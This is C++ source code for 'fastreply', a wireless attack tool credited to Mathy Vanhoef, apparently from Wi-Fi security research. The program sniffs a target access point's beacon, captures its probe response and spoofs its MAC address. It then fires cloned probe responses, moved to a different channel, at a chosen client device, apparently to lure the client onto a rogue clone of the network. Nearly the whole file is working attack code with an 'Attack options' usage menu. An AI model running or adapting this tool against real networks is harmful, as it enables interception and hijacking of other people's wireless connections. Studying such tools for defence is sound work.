#include <stdarg.h>
#include <getopt.h>
#include <signal.h>
#include <stdint.h>
#include <stdexcept>
#include <iostream>

#include "osal_wi.h"
#include "util.h"
#include "ieee80211header.h"
#include "MacAddr.h"
#include "crc.h"

struct options_t {
	char interface[128];

	MacAddr bssid;
	char ssid[128];

	MacAddr client;
	uint8_t testmode;
	int clonechan;
} opt;

struct global_t {
	bool exit;
} global;

char usage[] =

"\n"
"  fastreply - Mathy Vanhoef\n"
"\n"
"  usage: fastreply <options>\n"
"\n"
"  Attack options:\n"
"\n"
"      -i interface : Wireless interface to use\n"
"      -s ssid      : SSID of AP to use probe response from\n"
"      -t mac       : MAC of client to send fast probe responses to\n"
"      -c channel   : Channel of cloned response\n"
"\n"
"  Optional parameters:\n"
"\n"
"      -b bssid     : MAC address of AP to jam\n"
"      --testmode   : When specified the ssid of the clone is suffixed with _clone\n"
"\n";

void printUsage()
{
	printf("%s", usage);
}

bool parseConsoleArgs(int argc, char *argv[])
{
	int option_index = 0;
	int c;

	static struct option long_options[] = {
		{"help",      0, 0, 'h'},
		{"testmode",  0, 0, 'd'}
	};

	if (argc <= 1) {
		printUsage();
		return false;
	}

	// default settings
	memset(&opt, 0, sizeof(opt));

	while ((c = getopt_long(argc, argv, "i:s:b:t:c:dh", long_options, &option_index)) != -1)
	{
		switch (c)
		{
		case 'h':
			printUsage();
			// when help is requested, don't do anything other then displaying the message
			return false;

		case 'i':
			strncpy(opt.interface, optarg, sizeof(opt.interface));
			break;

		case 's':
			strncpy(opt.ssid, optarg, sizeof(opt.ssid));
			break;

		case 'b':
			try {
				opt.bssid = MacAddr::parse(optarg);
			} catch (const std::invalid_argument &ex) {
				std::cout << ex.what() << std::endl;
				return false;
			}
			break;

		case 't':
			try {
				opt.client = MacAddr::parse(optarg);
			} catch (const std::invalid_argument &ex) {
				std::cout << ex.what() << std::endl;
				return false;
			}
			break;

		case 'c':
			opt.clonechan = atoi(optarg);
			break;

		case 'd':
			opt.testmode = 1;
			break;

		default:
			printf("Unknown command line option '%c'\n", c);
			return false;
		}
	}

	if (opt.interface[0] == '\x0')
	{
		printf("You must specify an interface (-i).\n");
		printf("\"fastreply --help\" for help.\n");
		return false;
	}


	if (opt.bssid.empty() && opt.ssid[0] == '\x0')
	{
		printf("You must specify either target a SSID (-s) or a BSSID (-b).\n");
		printf("\"fastreply --help\" for help.\n");
		return false;
	}


	if (opt.client.empty())
	{
		printf("You must specify a client target MAC (-t).\n");
		printf("\"fastreply --help\" for help.\n");
		return false;
	}	

	return true;
}


bool is_our_beacon(uint8_t *buf, size_t len, void *data)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	char ssid[256];

	if (len < sizeof(ieee80211header) || hdr->fc.type != 0 || hdr->fc.subtype != 8
		|| memcmp(hdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
		return false;

	if (opt.bssid == MacAddr(hdr->addr2))
		return true;

	if (beacon_get_ssid(buf, len, ssid, sizeof(ssid)) && strcmp(ssid, opt.ssid) == 0)
		return true;

	return false;
}

int find_ap(wi_dev *dev)
{
	uint8_t buf[2048];
	ieee80211header *beaconhdr = (ieee80211header*)buf;
	struct timespec timeout;
	size_t len;
	int chan;

	timeout.tv_sec = 1;
	timeout.tv_nsec = 0;
	len = osal_wi_sniff(dev, buf, sizeof(buf), is_our_beacon, NULL, &timeout);
	if (len <= 0) {
		printf("Failed to capture beacon on AP interface\n");
		return -1;
	}

	// Update options based on captured info
	opt.bssid = MacAddr(beaconhdr->addr2);
	beacon_get_ssid(buf, len, opt.ssid, sizeof(opt.ssid));

	// Check channel of network
	chan = beacon_get_chan(buf, len);
	if (chan != osal_wi_getchannel(dev)) {
		printf("Changing channel of %s to %d\n", dev->name, chan);
		osal_wi_setchannel(dev, chan);
	}
	

	return 1;
}


bool is_probe_resp(uint8_t *buf, size_t len, void *data)
{
	ieee80211header *hdr = (ieee80211header*)buf;
	uint8_t *dest = (uint8_t*)data;

	// probe response
	if (len < sizeof(ieee80211header) || hdr->fc.type != 0 || hdr->fc.subtype != 5)
		return false;

	// from the AP to MAC address we used
	if (MacAddr(hdr->addr2) != opt.bssid || memcmp(hdr->addr1, dest, 6) != 0)
		return false;

	return true;
}


int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
{
	uint8_t probereq[128];
	ieee80211header *probehdr = (ieee80211header*)probereq;
	struct timespec timeout;
	size_t probereqlen, proberesplen;

	// Dot11 SSID Element (empty) is 4 zero bytes
	memset(probereq, 0, sizeof(ieee80211header) + 4);
	probehdr->fc.type = 0;
	probehdr->fc.subtype = 4;
	memcpy(probehdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	memcpy(probehdr->addr2, "\x12\x34\x56\x78\x9A\xBC", 6);
	memcpy(probehdr->addr3, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	
	probereqlen = sizeof(ieee80211header) + 4;
	beacon_set_ssid(probereq, &probereqlen, sizeof(probereq), opt.ssid);
	//dump_packet(probereq, probereqlen);
	if (osal_wi_write(ap, probereq, probereqlen) < 0)
		return -1;

	timeout.tv_sec = 1;
	timeout.tv_nsec = 0;
	proberesplen = osal_wi_sniff(ap, buf, len, is_probe_resp, (void*)"\x12\x34\x56\x78\x9A\xBC", &timeout);
	if (proberesplen < 0) {
		fprintf(stderr, "Failed to capture probe response\n");
		return -1;
	}

	// initialize probe response we will use
	beacon_set_chan(buf, proberesplen, opt.clonechan);
	if (opt.testmode) {
		char newssid[128];
		snprintf(newssid, sizeof(newssid), "%s_clone", opt.ssid);
		beacon_set_ssid(buf, &proberesplen, len, newssid);
	}

	//dump_packet(buf, proberesplen);

	return proberesplen;
}


int fastreply(wi_dev *dev)
{
	uint8_t reply[1024];
	ieee80211header *hdr = (ieee80211header*)reply;
	size_t replylen;

	// first detect beacons and see if we are on the correct channel
	if (find_ap(dev) < 0) {
		fprintf(stderr, "Unable to find target AP\n");
		return -1;
	}

	// then get the probe response example -- FIXME ask osal_wi if driver includes CRC
	replylen = get_probe_response(dev, reply, sizeof(reply));
	if (replylen < 0) {
		fprintf(stderr, "Unable to get example probe reply\n");
		return -1;
	}

	// set destination to be targat client
	opt.client.setbuf(hdr->addr1);
	// changing MAC address *MUST* be done before sending fastreply packet
	osal_wi_set_mac(dev, opt.bssid);

	if (osal_wi_fastreply_packet(dev, reply, replylen) < 0) {
		fprintf(stderr, "Failed to set reply packet\n");
		return -1;
	}

	while (!global.exit)
	{
		std::cout << "Fast probe reply: " << opt.client;
		if (opt.testmode) std::cout << " (RUNNING IN TEST MODE)";
		std::cout << std::endl;

		if (osal_wi_fastreply_start(dev, opt.client, 10 * 1000) < 0)
		{
			fprintf(stderr, "Something went wrong...\n");
			exit(1);
		}
	}

	return 1;
}

void handler_sigint(int signum)
{
	global.exit = true;

	fprintf(stderr, "\nStopping fast probe reply...\n");
}

int main(int argc, char *argv[])
{
	wi_dev dev;

	if (!parseConsoleArgs(argc, argv))
		return 2;

	signal(SIGINT, handler_sigint);
	if (osal_wi_open(opt.interface, &dev) < 0) return 1;
	osal_wi_include_badfcs(&dev, false);

	fastreply(&dev);

	osal_wi_close(&dev);
	return 0;
}



